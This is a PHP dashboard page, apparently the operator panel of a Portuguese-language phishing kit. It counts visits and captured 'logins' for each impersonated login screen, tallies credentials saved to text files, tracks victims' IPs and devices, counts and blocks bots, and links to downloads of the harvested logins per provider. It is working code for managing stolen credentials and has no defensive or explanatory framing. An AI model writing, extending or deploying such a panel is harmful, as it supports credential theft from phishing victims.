<?php
declare(strict_types=1);

require __DIR__ . '/includes/bootstrap.php';

painel_start_session();
painel_require_admin();

$stats = unified_total_stats();
$providers = unified_provider_stats();
$ipList = unified_ip_list();
$botList = unified_bot_list();
$flash = (string) ($_SESSION['flash'] ?? '');
$flashError = !empty($_SESSION['flash_error']);
unset($_SESSION['flash'], $_SESSION['flash_error']);

require __DIR__ . '/includes/layout.php';
painel_header('Dashboard', 'dashboard');
?>

<?php if ($flash): ?>
<div class="flash <?= $flashError ? 'flash-error' : 'flash-ok' ?>"><?= e($flash) ?></div>
<?php endif; ?>

<div class="hero-panel">
    <div class="hero-glow" aria-hidden="true"></div>
    <div class="hero-text">
        <span class="hero-badge">Painel unificado</span>
        <h2><?= e(painel_name()) ?></h2>
        <p>
            <span class="hero-chip hero-chip-mail">📧 Ver logins</span>
            <span class="hero-chip hero-chip-dl">⬇ Baixar logins</span>
            <span class="hero-note">Todas as telas num único painel — contadores em tempo real.</span>
        </p>
    </div>
    <button type="button" class="btn-nav-ver-logins btn-hero-logins" id="btn-open-console-hero">
        <span class="btn-mail-icon">📧</span>
        <span>Abrir console de logins</span>
    </button>
</div>

<div class="stats-grid">
    <div class="stat-card stat-visits">
        <span class="stat-icon">👁</span>
        <div class="num" data-stat="visits_today"><?= (int) $stats['visits_today'] ?></div>
        <div class="lbl">Visitas hoje</div>
    </div>
    <div class="stat-card stat-logins">
        <span class="stat-icon">🔐</span>
        <div class="num" data-stat="logins_today"><?= (int) $stats['logins_today'] ?></div>
        <div class="lbl">Logins hoje</div>
    </div>
    <div class="stat-card stat-saved">
        <span class="stat-icon">💾</span>
        <div class="num" data-stat="unique_credentials"><?= (int) $stats['unique_credentials'] ?></div>
        <div class="lbl">Salvos (txt)</div>
    </div>
    <div class="stat-card stat-ips">
        <span class="stat-icon">🌐</span>
        <div class="num" data-stat="unique_ips"><?= (int) $stats['unique_ips'] ?></div>
        <div class="lbl">IPs únicos</div>
    </div>
    <div class="stat-card stat-blocked">
        <span class="stat-icon">🚫</span>
        <div class="num" data-stat="blocked_ips"><?= (int) $stats['blocked_ips'] ?></div>
        <div class="lbl">IPs bloqueados</div>
    </div>
    <div class="stat-card stat-card-bots">
        <span class="stat-icon">🤖</span>
        <div class="num" data-stat="bots_today"><?= (int) $stats['bots_today'] ?></div>
        <div class="lbl">Bots hoje</div>
    </div>
</div>

<div class="device-counters">
    <div class="device-counter device-counter-iphone">
        <span class="device-counter-icon">📱</span>
        <div class="device-counter-body">
            <div class="device-counter-num" data-stat="iphone_today"><?= (int) $stats['iphone_today'] ?></div>
            <div class="device-counter-lbl">iPhone / iOS hoje</div>
            <div class="device-counter-sub"><span data-stat="iphone_total"><?= (int) $stats['iphone_total'] ?></span> total</div>
        </div>
    </div>
    <div class="device-counter device-counter-android">
        <span class="device-counter-icon">🤖</span>
        <div class="device-counter-body">
            <div class="device-counter-num" data-stat="android_today"><?= (int) $stats['android_today'] ?></div>
            <div class="device-counter-lbl">Android hoje</div>
            <div class="device-counter-sub"><span data-stat="android_total"><?= (int) $stats['android_total'] ?></span> total</div>
        </div>
    </div>
    <div class="device-counter device-counter-desktop">
        <span class="device-counter-icon">🖥️</span>
        <div class="device-counter-body">
            <div class="device-counter-num" data-stat="desktop_today"><?= (int) $stats['desktop_today'] ?></div>
            <div class="device-counter-lbl">Desktop hoje</div>
            <div class="device-counter-sub"><span data-stat="desktop_total"><?= (int) $stats['desktop_total'] ?></span> total</div>
        </div>
    </div>
</div>

<div class="panel provider-panel">
    <div class="panel-head">
        <h2>📊 Contadores por tela</h2>
        <span class="count">Atualiza em tempo real</span>
    </div>
    <div class="provider-grid" id="provider-grid">
        <?php foreach ($providers as $slug => $row): ?>
        <div class="provider-card" data-provider="<?= e($slug) ?>">
            <div class="provider-card-head">
                <span class="provider-name"><?= e($row['label']) ?></span>
                <span class="provider-badge" data-provider-count="<?= e($slug) ?>"><?= (int) $row['logins'] ?></span>
            </div>
            <div class="provider-meta">
                <span>Hoje: <strong data-provider-logins-today="<?= e($slug) ?>"><?= (int) ($row['stats']['logins_today'] ?? 0) ?></strong></span>
                <span>Visitas: <strong data-provider-visits="<?= e($slug) ?>"><?= (int) ($row['stats']['visits_today'] ?? 0) ?></strong></span>
            </div>
            <a href="download_logins.php?provider=<?= urlencode($slug) ?>" class="btn-provider-dl" title="Baixar só <?= e($row['label']) ?>">⬇ Baixar <?= e($row['label']) ?></a>
        </div>
        <?php endforeach; ?>
    </div>
</div>

<?php require __DIR__ . '/includes/ip_rows.php'; ?>

<script>
document.getElementById('btn-open-console-hero')?.addEventListener('click', function () {
    document.getElementById('btn-open-console')?.click();
});
</script>

<?php painel_footer(); ?>
